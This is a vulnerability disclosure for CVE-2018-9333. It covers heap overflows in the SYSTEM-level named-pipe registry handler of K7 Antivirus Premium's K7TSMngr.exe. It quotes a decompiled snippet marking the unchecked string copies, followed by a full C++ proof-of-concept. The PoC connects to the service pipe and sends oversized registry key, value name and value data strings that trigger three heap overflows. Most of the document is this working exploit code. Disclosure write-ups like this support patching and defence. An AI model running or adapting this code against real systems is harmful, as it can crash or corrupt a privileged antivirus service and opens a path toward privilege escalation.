# CVE-2018-9333

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Following on from the background piece above regarding the Pipe, the handler for the function id 0x10044 does not correctly validate its input and there are multiple areas to perform a heap overflow in a SYSTEM integrity process.

Note: This Function Id is a handler to help lower privileged processes perform registry operations via the System service which they would normally not be allowed to do.

What the code is attempting to do is parse a string similar to the *[HKLM\\SOFTWARE\VR]* so it can pull out the component parts. However when it breaks the string up, it copies it into internal buffers without any sanity checks which means it is relatively trivial to cause a heap overflow in 3 different locations.



```C++
// Snippet from sub_41EA90

// STATE: pszCurrent has come directly from the caller without any sanity checking performed on it.
// STATE: pszCurrent points to the beginning of HKLM
// STATE: pBuffer_0x2000 has been allocated by malloc and is 0x2000 bytes in size.
pFirstSlash = strchr(pszCurrent, '\\');
if ( !pFirstSlash )
    break;

// So if we have a \, then pFirstSlash will be valid
pFirstSlash_Plus_1 = pFirstSlash + 1;

// This low moves past the slash to find the ending bracket as it is trying to get the name of 
// the key without the HKLM on the front
pBracketLocation = strchr(pFirstSlash + 1, ']');
if ( !pBracketLocation )
    break;
pBracketPlus1 = pBracketLocation + 1;

// VULN: We just need to send in a key name that is larger than 0x2000 and we will cause a heap
// overflow in pBuffer_0x2000
lstrcpynA(pBuffer_0x2000_, pFirstSlash_Plus_1, pBracketLocation + 1 - pFirstSlash_Plus_1);// VULN - \ to ] needs to be larger than 2000
if ( *(_WORD *)pBracketPlus1 == '\r\n' || *(_WORD *)pBracketPlus1 == '\n\r' )
{

```

There very similar issues for the two other calls to *lstrcpynA* in this function. The PoC code will trigger them.


# PoC Code

```C++
#include <Windows.h>
#include <stdio.h>

#define _CRT_SECURE_NO_WARNINGS

// Pipe header structure
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

// Handle to the pipe
HANDLE g_hPipe = INVALID_HANDLE_VALUE;

/* 
Description:
    Initializes the connection to the pipe
 
Parameters:
    None

Returns:
    TRUE on success, otherwise FALSE
*/
BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


/* 
Description:
    Sends over the real pipe message that does the work
 
Parameters:
    dwFunctionId    Id to call
    pInput          Input buffer
    dwInSize        Size of pInput, in bytes
    pOutput         Output buffer
    dwOutSize       Size of pOutput, in bytes

Returns:
    TRUE on success, otherwise FALSE
*/
BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


void Vuln_HeapOverflow_CreateKey()
{
	DWORD dwSize = 0x40000;
	PCHAR pszData = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(pszData, 'A', dwSize);

	// Create a Key Name that is too large for the memory in the service
	PSTR pszString = "[HKLM\\";
	memcpy(pszData, pszString, strlen(pszString));

	pszData[dwSize - 3] = ']';
	pszData[dwSize - 2] = '\r';
	pszData[dwSize - 1] = 0x00;

	// Setup our pipe connection
	if (!InitPipe())
	{
		printf("Error: InitPipe failed\r\n");
		return;
	}

	// This will trigger the heap overflow
	if (!CallPipeFunction(0x10044, (PBYTE)pszData, dwSize, NULL, 0))
	{
		printf("Error: CallPipeFunction failed");
		return;
	}
}

void Vuln_HeapOverflow_ValueName()
{
	DWORD dwSize = 0x40000;
	PCHAR pszData = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(pszData, 'A', dwSize);

	// Create a ValueName that is too large value name in the service
	PSTR pszString = "[HKLM\\SOFTWARE\\VR]\r\"";
	memcpy(pszData, pszString, strlen(pszString));

	pszData[dwSize - 3] = '\"';
	pszData[dwSize - 2] = '=';
	pszData[dwSize - 1] = 0x00;

	// Setup our pipe connection
	if (!InitPipe())
	{
		printf("Error: InitPipe failed\r\n");
		return;
	}

	// This will trigger the heap overflow
	if (!CallPipeFunction(0x10044, (PBYTE)pszData, dwSize, NULL, 0))
	{
		printf("Error: CallPipeFunction failed");
		return;
	}
}

void Vuln_HeapOverflow_StringValueData()
{
	DWORD dwSize = 0x40000;
	PCHAR pszData = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(pszData, 'A', dwSize);

	// Create a String that is too long for the ValueData
	PSTR pszString = "[HKLM\\SOFTWARE\\VR]\r\"ValueName\"=\"";
	memcpy(pszData, pszString, strlen(pszString));

	pszData[dwSize - 2] = '\"';
	pszData[dwSize - 1] = 0x00;

	// Setup our pipe connection
	if (!InitPipe())
	{
		printf("Error: InitPipe failed\r\n");
		return;
	}

	// This will trigger the heap overflow
	if (!CallPipeFunction(0x10044, (PBYTE)pszData, dwSize, NULL, 0))
	{
		printf("Error: CallPipeFunction failed");
		return;
	}
}


int main(int argc, char** argv)
{
	DWORD dwSize = 0x4000;
	PCHAR pszData = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (argc != 2)
	{
		printf("Usage: (a|b|c|d)\r\n");
		return 0;
	}

	if (argv[1][0] == 'a') Vuln_HeapOverflow_CreateKey();
	else if (argv[1][0] == 'b') Vuln_HeapOverflow_ValueName();
	else if (argv[1][0] == 'c') Vuln_HeapOverflow_StringValueData();
	else
	{
		printf("Error: Unknown option: %s\r\n", argv[1]);
		return 0;
	}

	return 1;
}

```